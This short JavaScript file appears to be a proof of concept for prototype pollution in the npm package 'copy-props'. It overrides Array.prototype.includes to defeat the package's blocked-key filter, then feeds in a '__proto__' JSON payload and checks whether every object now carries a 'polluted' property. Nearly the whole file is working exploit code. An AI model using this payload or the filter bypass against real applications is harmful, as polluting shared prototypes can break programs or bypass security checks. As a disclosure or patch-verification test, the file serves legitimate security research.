Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
console.log({}.polluted);
const copyProps = require('copy-props');
const malicious_payload = '{"__proto__":{"polluted":"yes"}}';
copyProps(JSON.parse(malicious_payload), {});
console.log({}.polluted);